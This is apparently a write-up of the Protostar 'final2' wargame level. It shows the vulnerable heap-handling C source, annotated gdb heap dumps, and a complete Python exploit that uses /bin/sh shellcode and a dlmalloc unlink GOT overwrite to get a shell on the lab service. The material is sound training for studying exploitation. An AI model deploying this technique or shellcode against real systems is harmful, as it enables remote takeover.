## FINAL 2 ##
Remote heap level :)

Core files will be in /tmp.

This level is at /opt/protostar/bin/final2
### Source Code ###
```C
#include "../common/common.c"
#include "../common/malloc.c"

#define NAME "final2"
#define UID 0
#define GID 0
#define PORT 2993

#define REQSZ 128

void check_path(char *buf)
{
  char *start;
  char *p;
  int l;

  /*
  * Work out old software bug
  */

  p = rindex(buf, '/');
  l = strlen(p);
  if(p) {
      start = strstr(buf, "ROOT");
      if(start) {
          while(*start != '/') start--;
          memmove(start, p, l);
          printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start < buf ?
          "yes" : "no", start - buf);
      }
  }
}

int get_requests(int fd)
{
  char *buf;
  char *destroylist[256];
  int dll;
  int i;

  dll = 0;
  while(1) {
      if(dll >= 255) break;

      buf = calloc(REQSZ, 1);
      if(read(fd, buf, REQSZ) != REQSZ) break;

      if(strncmp(buf, "FSRD", 4) != 0) break;

      check_path(buf + 4);

      dll++;
  }

  for(i = 0; i < dll; i++) {
                write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID);

  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  get_requests(fd);

}
```
The goal of this task is to overflow the remote machine's heap exploiting the
dlmalloc unlink vulnerability. In this case, *memmove* is the function that will
overwrite the remote machine's heap metadata.

This is heap before free when we send the data described in the python code
below.
```
Breakpoint 4 at 0x804be13: file final2/final2.c, line 55.
                                            --------------------------------
0x804e000:      0x00000000      0x00000089  |   0x44525346      0x4f4f522f | <-- "FSRD/ROOT///"
             ---------------------------------------------------------------                               
0x804e010:   |  0x2f2f2f54  |   0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
             ----------------
                      ------ <- jump 0x10 (or to 0x804e030)
0x804e020:      0x4141|0eeb|    0x42424141      0x43434242      0x44444343
                      ------
            ----------------------------------------------------------------
0x804e030:  |   0x6850c031      0x68732f2f      0x69622f68      0x89e3896e | <- shellcode to open a /bin/sh
            |                                                ===============
0x804e040:  |   0xb0c289c1      0x3180cd0b      0x80cd40c0  |   0x2f2f2f2f
            -------------------------------------------------
0x804e050:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e060:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e070:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
                                             --------------------------------
0x804e080:      0x2f2f2f2f      0x2f2f2f2f   |  0x00000000      0x00000089  | <- second chunk
             --------------------------------   --------------------------  |
0x804e090:   |  0x44525346      0x544f4f52      0xfffffc2f      0xfffffcff  | <- before memmove
             |----------------------------- ---------------------------------
0x804e0a0:   |  0x04d410ff      0x04e02008  |    0x00000008      0x00000000
             --------------------------------
0x804e0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804bd40 <check_path+112>:     call   0x8048f8c <memmove@plt>
0x804bd45 <check_path+117>:     leave  
(gdb) c
Continuing.

0x804e000:      0x00000000      0x00000089      0x44525346      0x4f4f522f
0x804e010:      0x2f2f2f54      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e020:      0x41410eeb      0x42424141      0x43434242      0x44444343    <-------------------------------------------------------------
0x804e030:      0x6850c031      0x68732f2f      0x69622f68      0x89e3896e                                                                  |
0x804e040:      0xb0c289c1      0x3180cd0b      0x80cd40c0      0x2f2f2f2f                                                                  |
0x804e050:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f                                                                  |
0x804e060:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f                                                                  |
0x804e070:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f                                                                  |
                                            -------------------------------                                                                 |
0x804e080:      0x2f2f2f2f      0x2f2f2f2f  |   0xfffffffc      0xfffffffc |  <- After memmove                                              |
             -------------------------------                               |  <- 0x0804d410: address of GOT entry of write@plt - 12         |
0x804e090:   |  0x0804d410      0x0804e020      0xfffffc2f      0xfffffcff |  <- 0x0804e020: address on the heap where we want to jump to - |
             ---------------------------------------------------------------
0x804e0a0:      0x04d410ff      0x04e02008      0x00000008      0x00000000
0x804e0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804be01 <get_requests+186>:   call   0x8048dfc <write@plt>
0x804be06 <get_requests+191>:   mov    -0xc(%ebp),%eax
(gdb) c
Continuing.
```
After the first free
```
Breakpoint 2, 0x0804be01 in get_requests (fd=4) at final2/final2.c:54
54      in final2/final2.c
0x804e000:      0x00000000      0x00000085      0x0804d534      0x0804d534
0x804e010:      0x2f2f2f54      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
             --------------
0x804e020:   |  0x41410eeb|     0x42424141      0x0804d410      0x44444343  <- ebe0 will jump 0x10 or to 0x804e030
             --------------
             ---------------------------------------------------------------
0x804e030:   |  0x6850c031      0x68732f2f      0x69622f68      0x89e3896e | <- shellcode
             |                                              ----------------
0x804e040:   |  0xb0c289c1      0x3180cd0b      0x80cd40c0  |   0x2f2f2f2f
             ------------------------------------------------
0x804e050:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e060:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e070:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e080:      0x2f2f2f2f      0x00000084      0xfffffffc      0xfffffffc
0x804e090:      0x0804d410      0x0804e020      0xfffffc2f      0xfffffcff
0x804e0a0:      0x04d410ff      0x04e02008      0x00000008      0x00000000
0x804e0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804be01 <get_requests+186>:   call   0x8048dfc <write@plt>
0x804be06 <get_requests+191>:   mov    -0xc(%ebp),%eax
```
and the result
```
0x804e000:      0x00000000      0x00000085      0x0804d534      0x0804d534
0x804e010:      0x2f2f2f54      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e020:      0x41410eeb      0x42424141      0x0804d410      0x44444343
0x804e030:      0x6850c031      0x68732f2f      0x69622f68      0x89e3896e
0x804e040:      0xb0c289c1      0x3180cd0b      0x80cd40c0      0x2f2f2f2f
0x804e050:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e060:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e070:      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f      0x2f2f2f2f
0x804e080:      0x2f2f2f2f      0x00000084      0xfffffffc      0xfffffffc
0x804e090:      0x0804d410      0x0804e020      0xfffffc2f      0xfffffcff
0x804e0a0:      0x04d410ff      0x04e02008      0x00000008      0x00000000
0x804e0b0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0c0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804e0f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804be01 <get_requests+186>:   call   0x8048dfc <write@plt>
0x804be06 <get_requests+191>:   mov    -0xc(%ebp),%eax
(gdb) c
Continuing.
Executing new program: /bin/dash

```

```python
import struct
import socket
import telnetlib

REQSZ = 128
CHECK_STR = "FSRD"
HOST = '127.0.0.1'
PORT = 2993
BIG_FAKE_CHUNK = 0xfffffffc


def pad(message):
        padding = '\x00' * (REQSZ - len(message))
        _message = CHECK_STR + message + padding
        return _message[:REQSZ] 


bfc = struct.pack("I", BIG_FAKE_CHUNK)
jump_to = struct.pack("I", 0x804e020)
overwritten_got_entry = struct.pack("I", 0x804d41c - 0xc)
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(pad('/ROOT///' + '/' * 12 + '\xeb\x0e' + 'AAAABBBBCCCCDD' +  shellcode  + '/' * REQSZ))
s.send(pad("ROOT/" + bfc + bfc + overwritten_got_entry + jump_to)) 

while True:
        msg = raw_input("> ")
        if msg:
                print 'msg: {0}'.format(repr(pad(msg)))
                s.send(pad(msg))
        else:
                break

t = telnetlib.Telnet()
t.sock = s
t.interact()
s.close()
```
